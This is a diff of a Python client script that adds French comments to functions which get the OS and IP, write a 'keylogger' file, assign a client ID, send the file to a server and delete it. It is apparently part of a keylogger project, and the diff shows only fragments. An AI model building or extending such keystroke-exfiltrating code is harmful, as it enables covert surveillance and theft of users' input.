@@ -20,11 +20,11 @@ FILE = []
 configFile = configparser.ConfigParser()
 
 
-
+ #Obtenir le nom du os
 def get_os():
     return platform.system()
 
-
+#Récupérer l'adresse IP du client
 def getIP():
     try:
         # Créer un socket et se connecter à une adresse quelconque (ici, Google DNS)
@@ -37,7 +37,7 @@ def getIP():
         return None
 
 
-
+#Ecrire sur le fichier keylogger
 def writeFile():
     global COUNT
     global FILE
@@ -50,6 +50,8 @@ def writeFile():
     except Exception as e:
         print(f"An error occurred during writing file: {e}")
 
+
+#Supprimer le fichier
 def deleteFile(nameFile):
     global FILE
     print("A file is going to be deleted..")
@@ -63,6 +65,7 @@ def deleteFile(nameFile):
         print(f"An error occurred while deleting the file: {e}")
 
 
+#Attribuer un ID au client
 def setID():
     clientID = str(uuid.uuid4())
     configFile['Client'] = {'ID': clientID}
@@ -76,7 +79,7 @@ def setID():
     print(f"[*] Assigned ID: {clientID}")
     return clientID
 
-
+#Récupérer l'ID du client
 def getID():
     try:
         configFile.read(CLIENT_CONFIG_FILE)
@@ -85,6 +88,7 @@ def getID():
         return setID()
 
 
+#Envoyer le fichier au serveur
 def sendFile(socket):
     global FILE
     print("A file is going to be sent to the server..")
@@ -99,7 +103,7 @@ def sendFile(socket):
         print(f"An error occurred while sending file: {e}")
 
 
-
+#Se connecter au serveur
 def connectionServer():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
@@ -128,7 +132,7 @@ def connectionServer():
         
 
 def main():
-    
+
     writeFile()
     connectionServer()
     
